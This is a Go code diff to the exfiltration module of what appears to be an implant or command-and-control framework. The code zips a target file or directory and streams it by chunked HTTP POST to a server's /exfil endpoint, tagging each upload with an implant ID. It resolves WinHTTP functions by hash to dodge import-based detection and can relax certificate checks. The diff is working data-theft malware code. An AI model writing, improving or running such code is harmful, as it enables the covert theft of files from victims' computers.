@@ -2,7 +2,6 @@ package exfil
 
 import (
 	"archive/zip"
-	"bytes"
 	"fmt"
 	"io"
 	"os"
@@ -12,14 +11,14 @@ import (
 	wc "github.com/carved4/go-wincall"
 )
 
-func ZipPath(path string) ([]byte, error) {
+func StreamZip(path string, w io.Writer) error {
 	fi, err := os.Stat(path)
 	if err != nil {
-		return nil, fmt.Errorf("stat failed: %w", err)
+		return fmt.Errorf("stat failed: %w", err)
 	}
 
-	var buf bytes.Buffer
-	zw := zip.NewWriter(&buf)
+	zw := zip.NewWriter(w)
+	defer zw.Close()
 
 	if fi.IsDir() {
 		basePath := filepath.Clean(path)
@@ -69,49 +68,52 @@ func ZipPath(path string) ([]byte, error) {
 	} else {
 		header, err := zip.FileInfoHeader(fi)
 		if err != nil {
-			return nil, fmt.Errorf("create header failed: %w", err)
+			return fmt.Errorf("create header failed: %w", err)
 		}
 		header.Method = zip.Deflate
 
 		writer, err := zw.CreateHeader(header)
 		if err != nil {
-			return nil, fmt.Errorf("create file in zip failed: %w", err)
+			return fmt.Errorf("create file in zip failed: %w", err)
 		}
 
 		file, err := os.Open(path)
 		if err != nil {
-			return nil, fmt.Errorf("open file failed: %w", err)
+			return fmt.Errorf("open file failed: %w", err)
 		}
 		defer file.Close()
 
 		_, err = io.Copy(writer, file)
 		if err != nil {
-			return nil, fmt.Errorf("copy to zip failed: %w", err)
+			return fmt.Errorf("copy to zip failed: %w", err)
 		}
 	}
 
 	if err != nil {
-		return nil, fmt.Errorf("walk failed: %w", err)
+		return fmt.Errorf("walk failed: %w", err)
 	}
 
-	if err := zw.Close(); err != nil {
-		return nil, fmt.Errorf("close zip failed: %w", err)
-	}
-
-	return buf.Bytes(), nil
+	return nil
 }
 
-func PostExfil(serverURL string, zipData []byte, filename string, userAgent string, implantID string) error {
+func PostExfil(serverURL string, targetPath string, filename string, userAgent string, implantID string) error {
 	url := serverURL
 	if len(url) > 0 && url[len(url)-1] == '/' {
 		url = url[:len(url)-1]
 	}
 	url = url + "/exfil"
 
-	return httpPost(url, zipData, filename, userAgent, implantID)
+	pr, pw := io.Pipe()
+
+	go func() {
+		err := StreamZip(targetPath, pw)
+		pw.CloseWithError(err)
+	}()
+
+	return httpPost(url, pr, filename, userAgent, implantID)
 }
 
-func httpPost(url string, body []byte, filename string, userAgent string, implantID string) error {
+func httpPost(url string, bodyReader io.Reader, filename string, userAgent string, implantID string) error {
 	if len(url) < 8 {
 		return fmt.Errorf("invalid URL")
 	}
@@ -140,6 +142,7 @@ func httpPost(url string, body []byte, filename string, userAgent string, implan
 	winHttpConnect := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpConnect"))
 	winHttpOpenRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpOpenRequest"))
 	winHttpSendRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpSendRequest"))
+	winHttpWriteData := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpWriteData"))
 	winHttpReceiveResponse := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpReceiveResponse"))
 	winHttpCloseHandle := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpCloseHandle"))
 	winHttpAddRequestHeaders := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpAddRequestHeaders"))
@@ -178,7 +181,7 @@ func httpPost(url string, body []byte, filename string, userAgent string, implan
 		wc.CallG0(winHttpSetOption, hRequest, uintptr(31), uintptr(unsafe.Pointer(&secFlags)), uintptr(4))
 	}
 
-	contentType, _ := wc.UTF16ptr("Content-Type: application/zip\r\n")
+	contentType, _ := wc.UTF16ptr("Content-Type: application/zip\r\nTransfer-Encoding: chunked\r\n")
 	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(contentType)), ^uintptr(0), 0x20000000)
 
 	filenameHeader, _ := wc.UTF16ptr(fmt.Sprintf("X-Filename: %s\r\n", filename))
@@ -187,16 +190,44 @@ func httpPost(url string, body []byte, filename string, userAgent string, implan
 	implantHeader, _ := wc.UTF16ptr(fmt.Sprintf("X-Implant-ID: %s\r\n", implantID))
 	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(implantHeader)), ^uintptr(0), 0x20000000)
 
-	var bodyPtr uintptr
-	var bodyLen uintptr
-	if len(body) > 0 {
-		bodyPtr = uintptr(unsafe.Pointer(&body[0]))
-		bodyLen = uintptr(len(body))
-	}
-
-	result, _, _ := wc.CallG0(winHttpSendRequest, hRequest, 0, 0, bodyPtr, bodyLen, bodyLen, 0)
+	result, _, _ := wc.CallG0(winHttpSendRequest, hRequest, 0, 0, 0, 0, 0, 0)
 	if result == 0 {
 		return fmt.Errorf("WinHttpSendRequest failed")
+	}
+	buf := make([]byte, 8192)
+	for {
+		n, err := bodyReader.Read(buf)
+		if n > 0 {
+			header := fmt.Sprintf("%x\r\n", n)
+			headerBytes := []byte(header)
+			var written uint32
+			res, _, _ := wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&headerBytes[0])), uintptr(len(headerBytes)), uintptr(unsafe.Pointer(&written)))
+			if res == 0 {
+				return fmt.Errorf("WinHttpWriteData (header) failed")
+			}
+
+			res, _, _ = wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&written)))
+			if res == 0 {
+				return fmt.Errorf("WinHttpWriteData (data) failed")
+			}
+			crlf := []byte("\r\n")
+			res, _, _ = wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&crlf[0])), uintptr(2), uintptr(unsafe.Pointer(&written)))
+			if res == 0 {
+				return fmt.Errorf("WinHttpWriteData (footer) failed")
+			}
+		}
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return fmt.Errorf("read body failed: %w", err)
+		}
+	}
+	term := []byte("0\r\n\r\n")
+	var written uint32
+	res, _, _ := wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&term[0])), uintptr(len(term)), uintptr(unsafe.Pointer(&written)))
+	if res == 0 {
+		return fmt.Errorf("WinHttpWriteData (term) failed")
 	}
 
 	result, _, _ = wc.CallG0(winHttpReceiveResponse, hRequest, 0)
